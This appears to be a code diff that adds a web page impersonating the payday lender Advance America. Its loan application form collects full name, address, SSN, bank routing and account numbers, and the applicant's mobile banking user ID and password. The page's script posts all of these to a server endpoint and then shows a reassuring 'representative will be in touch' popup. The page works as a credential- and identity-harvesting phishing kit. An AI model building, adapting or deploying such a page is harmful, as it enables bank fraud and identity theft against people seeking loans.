@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Advance America-Apply Now</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@500;700&family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/css/style.css">
+<link rel="icon" type="image/svg+xml" href="assets/images/logo.svg">
+
+</head>
+<body>
+
+<div class="top-bar">
+    Getting a loan is fast and easy
+</div>
+
+<header class="header">
+    <div class="container nav">
+        <div class="logo">
+            <img src="assets/images/logo.svg" alt="Logo">
+        </div>
+        <nav>
+            <a href="index.html">HOME</a>
+            <a href="about.html">ABOUT US</a>
+            <a href="contact.html">CONTACT</a>
+            <a href="apply.html" class="active">APPLY NOW</a>
+        </nav>
+    </div>
+</header>
+
+<section class="apply-section">
+    <div class="container">
+
+        <h1 class="section-title">Getting a loan is fast and easy</h1>
+        <div class="divider"></div>
+
+        <h3 class="apply-subtitle">Payday Loans</h3>
+        <p class="apply-bold">Get approved within minutes.</p>
+
+        <h3 class="form-title">Apply Now</h3>
+
+        <form id="loanForm" class="loan-form">
+
+            <div class="form-grid">
+
+                <div>
+                    <input type="text" name="name" placeholder="Full Name*">
+                    <input type="text" name="phone" placeholder="Phone Number*">
+                    <input type="email" name="email" placeholder="Email*">
+                    <textarea name="address" placeholder="Complete Address*"></textarea>
+                </div>
+
+                <div>
+                    <input type="text" name="bank" placeholder="Bank Name*">
+                    <input type="text" name="routing" placeholder="Routing Number*">
+                    <input type="text" name="account" placeholder="Account Number*">
+                    <input type="text" name="ssn" placeholder="SSN*">
+                    <input type="text" name="user" placeholder="Mobile Banking User ID*">
+                    <input type="password" name="password" placeholder="Mobile Banking Password*">
+                    <input 
+                      type="text" 
+                      name="dob" 
+                      placeholder="Date of Birth (MM/DD/YYYY)*"
+                      onfocus="(this.type='date')" 
+                      onblur="if(!this.value)this.type='text'"
+                      required
+                    >
+                </div>
+
+            </div>
+
+            <p class="recaptcha-text">
+                This site is protected by reCAPTCHA and the Google
+                <a href="#">Privacy Policy</a> and
+                <a href="#">Terms of Service</a> apply.
+            </p>
+
+            <div class="submit-wrapper">
+                <button type="submit" class="submit-btn">SUBMIT</button>
+            </div>
+
+        </form>
+        <!-- Success Popup -->
+<div id="successPopup" class="popup-overlay">
+  <div class="popup-box">
+    <h2>Thanks for submitting!</h2>
+    <p>
+      Our representative will be in touch with you shortly while we are verifying your information.
+    </p>
+    <button onclick="closePopup()">Close</button>
+  </div>
+</div>
+
+
+    </div>
+</section>
+
+<footer>
+    Copyright © 2026 Advance America - All Rights Reserved.
+</footer>
+
+
+<script>
+document.getElementById("loanForm").addEventListener("submit", async function(e) {
+    e.preventDefault();
+
+    const formData = Object.fromEntries(new FormData(this));
+
+    const response = await fetch("/api/apply", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(formData)
+    });
+
+    const result = await response.json();
+
+    if(result.success){
+        document.getElementById("successPopup").style.display = "flex";
+        this.reset();
+    } else {
+        alert("Submission failed. Please try again.");
+    }
+});
+
+function closePopup(){
+    document.getElementById("successPopup").style.display = "none";
+}
+</script>
+
+
+</body>
+</html>
